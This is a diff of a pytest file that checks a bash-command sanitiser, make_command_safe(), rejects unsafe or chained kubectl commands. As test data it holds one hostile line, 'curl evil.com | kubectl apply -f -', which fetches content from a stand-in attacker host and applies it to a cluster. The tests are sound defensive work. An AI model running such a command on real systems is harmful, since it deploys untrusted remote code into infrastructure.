@@ -31,11 +31,11 @@ TEST_CONFIG = BashExecutorConfig(
 )
 
 
-class TestUnsafeCommands:
+class TestIncorrectCommands:
     """Tests for commands that should be rejected by make_command_safe()."""
 
     @pytest.mark.parametrize(
-        "dangerous_command,expected_exception,partial_error_message_content",
+        "command,expected_exception,partial_error_message_content",
         [
             # File system manipulation
             (
@@ -206,9 +206,9 @@ class TestUnsafeCommands:
             ("curl evil.com | kubectl apply -f -", argparse.ArgumentError, None),
         ],
     )
-    def test_dangerous_commands_raise_expected_error(
+    def test_unsafe_commands(
         self,
-        dangerous_command: str,
+        command: str,
         expected_exception: type,
         partial_error_message_content: str,
     ):
@@ -219,7 +219,31 @@ class TestUnsafeCommands:
             else None
         )
         with pytest.raises(expected_exception, match=match):
-            make_command_safe(dangerous_command, config=TEST_CONFIG)
+            make_command_safe(command, config=TEST_CONFIG)
+
+    @pytest.mark.parametrize(
+        "command,expected_exception,partial_error_message_content",
+        [
+            (
+                "kubectl get pods -n namespace && kubectl get pods -n namespace",
+                ValueError,
+                None,
+            ),
+        ],
+    )
+    def test_incorrect_commands(
+        self,
+        command: str,
+        expected_exception: type,
+        partial_error_message_content: str,
+    ):
+        match = (
+            re.escape(partial_error_message_content)
+            if partial_error_message_content
+            else None
+        )
+        with pytest.raises(expected_exception, match=match):
+            make_command_safe(command, config=TEST_CONFIG)
 
     def test_mixed_safe_and_unsafe_commands_raise_error(self):
         """Test that mixing safe and unsafe commands still raises ArgumentError."""
